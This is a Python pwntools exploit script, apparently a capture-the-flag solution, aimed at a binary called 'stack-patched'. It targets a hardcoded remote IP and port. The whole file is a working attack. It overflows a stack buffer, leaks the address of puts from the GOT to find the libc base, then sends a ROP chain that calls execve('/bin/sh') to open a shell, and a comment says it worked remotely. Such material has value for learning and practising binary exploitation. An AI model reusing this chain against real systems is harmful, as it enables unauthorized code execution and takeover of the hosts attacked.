#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./stack-patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./stack-patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def rop(base):
    # rax: 0x3b
    # rdi: &“/bin/sh”
    # rsi: 0
    # rdx: 0

    # first, find the /bin/sh string by ROPgadget
    # ROPgadget --binary ./libc-2.31.so --string "/bin/sh"
    # second, in ropium, do
    # find sys_execve(0x1b75aa, 0, 0)
    pop_rdi = p64(base + 0x26b72) + p64(base + 0x1b75aa)
    pop_rsi = p64(base + 0x0000000000027529) + p64(0x0000000000000000)
    pop_rdx = p64(base + 0x142071)
    # we put pop_rax the last because pop_rdx will override eax's value
    pop_rax = p64(base + 0x4a54f) + p64(0x3b)
    syscall = p64(base + 0x2584d)
    chain = pop_rdi + pop_rsi + pop_rdx + pop_rax + syscall
    return chain


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
break *0x4012b9
continue
'''.format(**locals())


def leak():
    pop_rdi = 0x4013e3 #find rdi=0x1
    plt_puts = 0x4010b0 #objdump of binary puts@plt
    return p64(pop_rdi) + p64(0x404018) + p64(plt_puts) # 0x404018 is puts got, also get using objdump of binary 

# io = start()
io = remote('107.21.135.41', 6666)


io.recvuntil(b'the base pointer: ')
bp = int(io.recvline(keepends=False), 16)

io.recvuntil(b'will be stored: ')
buf = int(io.recvline(keepends=False), 16)

io.recvuntil(b'your buffer:\n')

exploit = cyclic(bp - buf) + p64(0x4040a0) + leak() + p64(0x4012b9)

io.sendline(exploit)
leaked_bytes = io.recvline(keepends=False)
# print(leaked_bytes)
leaked_puts = u64(leaked_bytes.ljust(8, b"\0"))
print(f"leaked puts: 0x{leaked_puts:x}")

# objdump -T ./libc | grep puts
offset_puts = 0x875a0
base_libc = leaked_puts - offset_puts

print(f"base of libc: 0x{base_libc:x}")

io.sendline(cyclic(0x40 + 8) + rop(base_libc))

io.interactive()

# worked remote, not on local

